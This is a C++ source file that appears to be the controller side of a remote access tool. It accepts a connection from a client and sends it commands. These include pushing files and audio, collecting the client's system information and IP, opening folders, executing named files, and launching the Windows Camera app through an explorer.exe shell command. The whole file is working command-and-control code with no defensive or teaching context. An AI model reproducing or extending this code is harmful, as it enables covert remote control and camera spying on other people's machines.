#include <iostream>
#include <cstring>
#include <sys/socket.h>
#include <stdio.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <limits>
#include "../Headers/menu.h"
#include <unistd.h>
#include "../Headers/CaesarCipherShift.h"
#include "Send-File/sendFile.h"

int main() {
    int serverFileDescripter; // 0 = standard input, 1= standard output, 2= standard error, 3 = socket created
    serverFileDescripter = socket(AF_INET, SOCK_STREAM, 0);
    if(serverFileDescripter == -1) {
        std::cout << ERROR_PREFIX << " Socket failed to create\n";
        return 1;
    } else {
        std::cout << SUCCESS_PREFIX << " Socket created\n";
    }

    sockaddr_in serverAddress{};
    serverAddress.sin_family = AF_INET; // IPv4
    serverAddress.sin_addr.s_addr = INADDR_ANY; // ip address to bind to
    serverAddress.sin_port = htons(PORT); // htons converts port to network byte order

    int bindSock;
    bindSock = bind(serverFileDescripter, (sockaddr*)&serverAddress, sizeof(serverAddress));
    if(bindSock == -1) {
        std::cout << ERROR_PREFIX << " Bind failed to create\n";
        perror(ERROR_PREFIX);
        return 1;
    } else {
        std::cout << SUCCESS_PREFIX << " Bind created\n";
    }

    int listening;
    listening = listen(serverFileDescripter, 1);
    if(listening == -1) {
        std::cout << ERROR_PREFIX << " Failed to find incoming connection requests\n";
        close(serverFileDescripter);
        return 1;
    } else {
        std::cout << PENDING_PREFIX << " Listening on port: " << PORT << "...\n";
    }

    int clientFileDescriptor;
    socklen_t serverlength = sizeof(serverAddress);
    clientFileDescriptor = accept(serverFileDescripter, (sockaddr*) &serverAddress, &serverlength);
    if(clientFileDescriptor == -1) {
        std::cout << ERROR_PREFIX << " Connection failed\n";
        close(serverFileDescripter);
        return 1;
    } else {
        std::cout << SUCCESS_PREFIX << " Connection established\n";
    }

    char buffer[BUFFERSIZE];
    int bytesRec, bytesSend;
    while(true) {
        int choice = menu();

        if(choice == TYPE_TEXT) {
            std::cout << CONSOLE_PREFIX << " Type /back to return to the menu.\n";

            while(true) {
                std::string txt;
                std::cout << CONSOLE_PREFIX << " Type here: ";
                std::getline(std::cin, txt);

                if(txt == "/back") {
                    int back = TYPE_BACK;
                    bytesSend = send(clientFileDescriptor, &back, sizeof(back), 0);
                    break;
                } else if (txt.empty()) {
                    continue;
                }

                int type = TYPE_TEXT;
                bytesSend = send(clientFileDescriptor, &type, sizeof(type), 0);
                bytesSend = send(clientFileDescriptor, txt.c_str(), txt.length(), 0);

                bytesRec = recv(clientFileDescriptor, buffer, BUFFERSIZE, 0);
                std::string clientRec(buffer, bytesRec);

                std::cout << clientRec << std::endl;
            }
        }

        if(choice == TYPE_FILE) {    
            int type = TYPE_FILE;
            bytesSend = send(clientFileDescriptor, &type, sizeof(type), 0);       
            std::string path;
            std::cout << CONSOLE_PREFIX << " Enter path: ";
            std::getline(std::cin, path);
            std::cout << std::endl;

            sendFile(clientFileDescriptor, path);
        }

        if(choice == TYPE_INFO) {
            int type = TYPE_INFO;
            bytesSend = send(clientFileDescriptor, &type, sizeof(type), 0);

            std::cout << PENDING_PREFIX << " Requesting client information..\n";

            bytesRec = recv(clientFileDescriptor, buffer, sizeof(buffer), 0);

            if(bytesRec > 0) {
                std::string info(buffer, bytesRec);
                std::cout << SUCCESS_PREFIX << " Received client information\n\n";
                char clientsIP[INET_ADDRSTRLEN];
                inet_ntop(AF_INET, &serverAddress.sin_addr, clientsIP, INET_ADDRSTRLEN);
                std::cout << CONSOLE_PREFIX << " |!|!|!|!|!|!| CLIENT INFORMATION |!|!|!|!|!|!|\n";
                std::cout << SUCCESS_PREFIX << " Client IP: " << clientsIP <<  std::endl;
                std::cout << info;
                std::cout << CONSOLE_PREFIX << " |!|!|!|!|!|!| ------------------ |!|!|!|!|!|!|\n";
            } else {
                std::cout << ERROR_PREFIX << " Failed to receive client information\n";
            }
        }

        if(choice == TYPE_EXECUTE) {
            int type = TYPE_EXECUTE;
            bytesSend = send(clientFileDescriptor, &type, sizeof(type), 0);
            while(true) {
                std::cout << CONSOLE_PREFIX << " 1 - Open a folder\n";
                std::cout << CONSOLE_PREFIX << " 2 - Execute a file\n";
                std::cout << CONSOLE_PREFIX << " 3 - Open camera\n\n";

                int choice;
                std::cout << CONSOLE_PREFIX << " Choose an option: ";
                std::cin >> choice;
                if(std::cin.fail()) {
                    std::cin.clear();
                    std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n');
                    std::cout << ERROR_PREFIX << " Invalid usage, please enter a number between 1-3\n";
                    continue;
                } else if (!(choice >= 1 && choice <= 3)) {
                    std::cout << ERROR_PREFIX << " Invalid usage, please enter a number between 1-3\n";
                    continue;
                }

                switch(choice) {
                    case 1: {
                        int subtype = 1;
                        bytesSend = send(clientFileDescriptor, &subtype, sizeof(subtype), 0);

                        std::cout << CONSOLE_PREFIX << " Enter the path: ";
                        std::string path;
                        std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n');
                        std::getline(std::cin, path);

                        bytesSend = send(clientFileDescriptor, path.c_str(), path.length(), 0);
                        std::cout << PENDING_PREFIX << " Opening " << path << "...\n";  
                        if(bytesSend <= 0) {
                            std::cout << ERROR_PREFIX << " Failed to send " << path << std::endl;
                            break;
                        }

                        bytesRec = recv(clientFileDescriptor, buffer, sizeof(buffer), 0);
                        if(bytesRec <= 0) {
                            std::cout << ERROR_PREFIX << " Cannot receive confirmation\n";
                            break;
                        }

                        std::string pathConfirmation(buffer, bytesRec);
                        std::cout << pathConfirmation << std::endl;
                        break;
                    }

                    case 2: {
                        int subtype = 2;
                        bytesSend = send(clientFileDescriptor, &subtype, sizeof(subtype), 0);
                        
                        std::cout << CONSOLE_PREFIX << " Enter file name: ";
                        std::string fileName;
                        std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n');
                        std::getline(std::cin, fileName);

                        std::cout << PENDING_PREFIX << " Executing " << fileName << "...\n";
                        bytesSend = send(clientFileDescriptor, fileName.c_str(), fileName.length(), 0);
                        if(bytesSend <= 0) {
                            std::cout << ERROR_PREFIX << " Failed to send " << fileName << std::endl;
                            break;
                        }

                        bytesRec = recv(clientFileDescriptor, buffer, BUFFERSIZE, 0);
                        if(bytesRec <= 0) {
                            std::cout << "Failed to execute " << fileName << std::endl;
                            break;
                        }

                        std::string exeFileNameConfirmation(buffer, bytesRec);
                        std::cout << exeFileNameConfirmation << std::endl;
                        break;
                    }

                    case 3: {
                        int subtype = 3;
                        bytesSend = send(clientFileDescriptor, &subtype, sizeof(subtype), 0);

                        std::string cmd = "explorer.exe \"shell:AppsFolder\\Microsoft.WindowsCamera_8wekyb3d8bbwe!App\"";

                        std::cout << PENDING_PREFIX << " Sending camera execution command...\n";
                        bytesSend = send(clientFileDescriptor, cmd.c_str(), cmd.length(), 0);
                        if(bytesSend <= 0) {
                            std::cout << ERROR_PREFIX << " Failed to send camera execution command\n";
                            break;
                        }

                        std::cout << SUCCESS_PREFIX << " Sent camera execution command\n";
                        break;
                    }
                }

                break;
            }
        }

        if(choice == TYPE_SOUND) {
            int type = TYPE_SOUND;
            bytesSend = send(clientFileDescriptor, &type, sizeof(type), 0);

            std::string path;
            std::cout << CONSOLE_PREFIX << " Enter audio path: ";
            std::getline(std::cin, path);
            std::cout << std::endl;

            sendFile(clientFileDescriptor, path);
        }

        if(choice == TYPE_EXIT) {
            int type = TYPE_EXIT;
            bytesSend = send(clientFileDescriptor, &type, sizeof(type), 0);
            break;
        }
    }

    close(serverFileDescripter);
    return 0;
}
